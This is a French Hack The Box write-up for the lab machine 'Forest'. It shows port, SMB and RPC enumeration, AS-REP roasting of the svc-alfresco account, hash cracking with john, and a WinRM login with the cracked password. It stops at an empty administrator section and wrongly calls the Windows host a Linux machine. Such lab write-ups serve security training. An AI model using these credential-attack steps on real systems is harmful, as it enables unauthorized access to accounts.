![Pic1](../img/forest1.PNG?raw=true) </br>

# Introduction

Forest est une machine linux dont l'adresse IP est 10.10.10.161.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* 
</br>

# Enumération initiale
Nous commençons par l'énumération des services et ports de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.161
```
![Pic2](../img/admirer2.PNG?raw=true) </br>
Plusieurs ports ouverts, on peut déjà tenter une énumération des dossiers partagés par SMB :
```bash
$ smbmap -H 10.10.10.161
```
![Pic3](../img/admirer3.PNG?raw=true) </br>
Aucun partage dispo.</br>
On peut faire une énumération RPC avec rpcclient :
```bash
$ rpcclient -U "" -N 10.10.10.161
rpcclient > enumdomusers
```
![Pic4](../img/admirer4.PNG?raw=true) </br>
![Pic5](../img/admirer5.PNG?raw=true) </br>

# Obtenir un accès utilisateur
En ayant la liste des utilisateurs, nous pouvons tenter d'obtenir un ticket Kerberos pour chacun, cela fonctionnera que pour le compte
svc-alfresco :
```bash
$ GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco
```
![Pic6](../img/admirer6.PNG?raw=true) </br>

Nous pouvons le cracker avec john :
```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic7](../img/admirer7.PNG?raw=true) </br>
Nous pouvons alors nous connecter via le port 5985 avec Evil-WinRM et lire le user.txt :
```bash
$ evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
> cat ../Desktop/user.txt
```
![Pic8](../img/admirer8.PNG?raw=true) </br>

# Obtenir un accès administrateur
